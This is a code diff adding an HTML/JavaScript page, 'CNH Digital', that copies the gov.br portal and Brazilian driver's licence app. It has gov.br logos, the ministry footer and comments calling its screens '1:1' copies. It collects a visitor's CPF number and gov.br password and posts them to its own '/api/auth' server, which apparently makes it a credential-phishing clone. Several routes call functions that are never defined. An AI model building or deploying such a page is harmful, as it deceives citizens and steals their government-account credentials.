@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>CNH Digital</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="apple-mobile-web-app-title" content="CNH Digital">
+  <link rel="manifest" href="/manifest.json">
+  <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@300;400;600;700&family=Raleway:wght@400;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* RESET E BASE */
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    
+    body { 
+      font-family: 'Raleway', 'Rawline', sans-serif; 
+      background-color: #f6f6f6; 
+      min-height: 100dvh; 
+      overflow-x: hidden;
+    }
+    
+    /* APP CONTAINER (Centralizado no Desktop) */
+    #app { 
+      width: 100%; 
+      min-height: 100dvh; 
+      background: #fff; 
+      display: flex; 
+      flex-direction: column; 
+      position: relative;
+    }
+
+    @media (min-width: 1024px) {
+      body { background-color: #000; display: flex; justify-content: center; align-items: center; }
+      #app {
+        width: 420px;
+        height: 840px;
+        min-height: auto;
+        max-height: 90vh;
+        border-radius: 20px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        overflow-y: auto;
+      }
+    }
+
+    /* ESTILOS SPLASH (1:1 MARINHA - IMAGEM INTEIRA) */
+    .splash-container { flex: 1; display: flex; flex-direction: column; background: #fff; }
+    .capa-area-full { width: 100%; position: relative; flex-shrink: 0; }
+    .capa-area-full img { width: 100%; display: block; }
+    .capa-area-full::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 40%; background: linear-gradient(to bottom, rgba(0,0,0,0.4), transparent); }
+    
+    .conteudo-branco-full { 
+      flex: 1; 
+      background-color: white; 
+      border-top-left-radius: 25px; 
+      border-top-right-radius: 25px; 
+      margin-top: -25px; 
+      position: relative; 
+      z-index: 10; 
+      padding: 20px 30px; 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      justify-content: center; 
+      gap: 15px; 
+    }
+    
+    .logo-container img { max-width: 140px; display: block; margin-bottom: 5px; }
+    .termos-texto { text-align: center; font-size: 12px; color: #333; line-height: 1.3; margin-bottom: 5px; }
+    .termos-texto a { color: #1351b4; text-decoration: underline; font-weight: 600; }
+    .btn-gov { background-color: #1351b4; color: white; width: 100%; padding: 14px 0; border-radius: 50px; border: none; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25); text-transform: uppercase; }
+
+    /* ESTILOS LOGIN (1:1 MARINHA) */
+    .header-marinha { display: flex; justify-content: flex-start; align-items: center; margin-bottom: 24px; padding: 16px 20px; width: 100%; background-color: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+    .logo-gov-login { width: 100px; }
+    .login-card { width: calc(100% - 40px); margin: 0 auto; background-color: #fff; padding: 24px 16px 22px; box-shadow: 0 2px 12px rgba(0,0,0,0.16); border-radius: 4px; }
+    .title-marinha { font-weight: 600; font-size: 18px; color: #000; margin-bottom: 20px; text-align: left; }
+    .subtitle-marinha { font-size: 16px; font-weight: 600; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; color: #333; }
+    .subtitle-marinha i { color: #1351b4; }
+    .description-marinha { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.4; }
+    .label-marinha { font-weight: 600; font-size: 14px; color: #333; margin-bottom: 5px; display: block; }
+    .input-field-marinha { width: 100%; padding: 12px 15px; font-size: 16px; border: 1px solid #ccc; border-radius: 4px; outline: none; background-color: #fff; color: #333; }
+    .input-field-marinha:focus { border-color: #d84800; background-color: #fffbe6; }
+    .alert-error-marinha { background-color: #fbf5d0; border: 1px solid #e5c22d; border-radius: 4px; padding: 12px 15px; margin-bottom: 20px; display: none; align-items: center; font-size: 14px; color: #000; font-weight: 500; }
+    .btn-primary-marinha { width: 100%; padding: 12px; background-color: #1351b4; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; cursor: pointer; }
+    .footer-marinha { margin-top: 30px; text-align: center; font-size: 12px; color: #666; padding-bottom: 20px; }
+  </style>
+</head>
+<body>
+<div id="app"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+<script>
+(function() {
+  'use strict';
+
+  let userData = null;
+  const app = document.getElementById('app');
+
+  // NAVEGAÇÃO POR PATHNAME
+  function navigate(path) {
+    window.history.pushState({}, '', path);
+    handleRoute();
+  }
+
+  window.onpopstate = () => handleRoute();
+
+  function handleRoute() {
+    const path = window.location.pathname;
+    if (path === '/') showHome();
+    else if (path === '/login') showSplash();
+    else if (path === '/cpf') showLoginCPF();
+    else if (path === '/senha') showLoginSenha();
+    else if (path === '/dashboard') showDashboard();
+    else if (path === '/condutor') showCondutor();
+    else if (path === '/habilitacao') showHabilitacao();
+    else navigate('/');
+  }
+
+  // ============================================================
+  // TELA HOME (GOV PORTAL)
+  // ============================================================
+  function showHome() {
+    app.innerHTML = `
+      <div style="background:#fff; min-height:100%; display:flex; flex-direction:column;">
+        <header style="background:#071D41; padding:15px; color:#fff; display:flex; align-items:center; gap:10px;">
+          <img src="/img_marinha/logo.png" style="height:25px; filter:brightness(0) invert(1);">
+          <span style="font-weight:700; font-size:14px;">gov.br</span>
+        </header>
+        <div style="padding:20px;">
+          <h1 style="font-size:22px; color:#1351B4; margin-bottom:15px;">Motorista</h1>
+          <p style="font-size:14px; color:#333; line-height:1.6; margin-bottom:20px;">
+            Encontre serviços para motoristas de todas as categorias, como obter carteira de habilitação, dados de veículos, multas e infrações, acidentes e muito mais.
+          </p>
+          <div onclick="navigate('/login')" style="padding:20px; border:1px solid #ddd; border-radius:8px; display:flex; justify-content:space-between; align-items:center; cursor:pointer; background:#f9f9f9;">
+            <span style="font-weight:700; color:#1351B4;">Minha habilitação</span>
+            <i class="fas fa-chevron-right" style="color:#888;"></i>
+          </div>
+          <div style="padding:20px; border:1px solid #ddd; border-radius:8px; display:flex; justify-content:space-between; align-items:center; cursor:pointer; margin-top:10px;">
+            <span style="font-weight:700; color:#1351B4;">Veículos</span>
+            <i class="fas fa-chevron-right" style="color:#888;"></i>
+          </div>
+        </div>
+      </div>
+    `;
+  }
+
+  // ============================================================
+  // TELA 1 - SPLASH (MARINHA - IMAGEM INTEIRA)
+  // ============================================================
+  function showSplash() {
+    app.innerHTML = `
+      <div class="splash-container">
+        <div class="capa-area-full">
+          <img src="/img_marinha/capa_cnh.png" alt="Capa CNH">
+        </div>
+        <div class="conteudo-branco-full">
+          <div class="logo-container">
+            <img src="/assets/cnh_logo_brasil.png" alt="CNH DO BRASIL">
+          </div>
+          <div style="width: 100%;">
+            <div class="termos-texto">
+              Ao entrar, você concorda com nosso <br>
+              <a href="#">Termo de Responsabilidade</a> e <br>
+              <a href="#">Política de Privacidade</a>
+            </div>
+            <button onclick="navigate('/cpf')" class="btn-gov">ENTRAR COM gov.br</button>
+          </div>
+        </div>
+      </div>
+    `;
+  }
+
+  // ============================================================
+  // TELA 2 - LOGIN CPF (MARINHA)
+  // ============================================================
+  function showLoginCPF() {
+    app.innerHTML = `
+      <div style="background-color:#f6f6f6; flex:1; display:flex; flex-direction:column; align-items:center;">
+        <div class="header-marinha">
+          <img src="/img_marinha/logo.png" class="logo-gov-login" alt="gov.br">
+        </div>
+        <div class="login-card">
+          <div class="title-marinha">Identifique-se no gov.br</div>
+          <div class="subtitle-marinha"><i class="fas fa-id-card"></i> Número do CPF</div>
+          <div class="description-marinha">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</div>
+          <div class="input-group">
+            <label class="label-marinha">CPF</label>
+            <input type="tel" id="cpf-input" class="input-field-marinha" placeholder="Digite seu CPF" maxlength="14" inputmode="numeric" oninput="maskCPF(this)" onkeydown="if(event.key==='Enter')btnContinuar()">
+          </div>
+          <div id="cpf-error" class="alert-error-marinha"><i class="fas fa-exclamation-triangle"></i> CPF informado inválido.</div>
+          <button class="btn-primary-marinha" style="margin-top:20px;" onclick="btnContinuar()">Continuar</button>
+          <div class="footer-marinha">Ministério da Gestão e da Inovação em Serviços Públicos</div>
+        </div>
+      </div>
+    `;
+    setTimeout(() => document.getElementById('cpf-input')?.focus(), 100);
+  }
+
+  window.maskCPF = function(el) {
+    document.getElementById('cpf-error').style.display = 'none';
+    let v = el.value.replace(/\D/g, '').slice(0, 11);
+    if (v.length >= 10) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    else if (v.length >= 7) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+    else if (v.length >= 4) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+    el.value = v;
+  };
+
+  window.btnContinuar = function() {
+    const cpfVal = document.getElementById('cpf-input').value;
+    const digits = cpfVal.replace(/\D/g, '');
+    if (digits.length < 11) {
+      document.getElementById('cpf-error').style.display = 'flex';
+      return;
+    }
+    sessionStorage.setItem('temp_cpf', digits);
+    navigate('/senha');
+  };
+
+  // ============================================================
+  // TELA 3 - LOGIN SENHA
+  // ============================================================
+  function showLoginSenha() {
+    const cpf = sessionStorage.getItem('temp_cpf') || '';
+    app.innerHTML = `
+      <div style="background-color:#f6f6f6; flex:1; display:flex; flex-direction:column; align-items:center;">
+        <div class="header-marinha">
+          <img src="/img_marinha/logo.png" class="logo-gov-login" alt="gov.br">
+        </div>
+        <div class="login-card">
+          <div class="title-marinha">Identifique-se no gov.br</div>
+          <div class="subtitle-marinha"><i class="fas fa-lock"></i> Digite sua senha</div>
+          <p style="font-size:14px; margin-bottom:20px;">CPF: <strong>${cpf}</strong></p>
+          <div class="input-group">
+            <label class="label-marinha">Senha</label>
+            <input type="password" id="senha-input" class="input-field-marinha" placeholder="Digite sua senha" onkeydown="if(event.key==='Enter')doLogin()">
+          </div>
+          <div id="senha-error" class="alert-error-marinha"><i class="fas fa-exclamation-triangle"></i> Senha incorreta.</div>
+          <button class="btn-primary-marinha" style="margin-top:20px;" onclick="doLogin()">Entrar</button>
+          <div class="footer-marinha">Ministério da Gestão e da Inovação em Serviços Públicos</div>
+        </div>
+      </div>
+    `;
+    setTimeout(() => document.getElementById('senha-input')?.focus(), 100);
+  }
+
+  window.doLogin = async function() {
+    const senha = document.getElementById('senha-input').value;
+    const cpf = sessionStorage.getItem('temp_cpf');
+    if (!senha) return;
+    try {
+      const res = await fetch('/api/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cpf, senha })
+      });
+      const json = await res.json();
+      if (json.success) {
+        userData = json.user;
+        navigate('/dashboard');
+      } else {
+        document.getElementById('senha-error').style.display = 'flex';
+      }
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
+  // INICIALIZAR
+  handleRoute();
+
+})();
+</script>
+</body>
+</html>
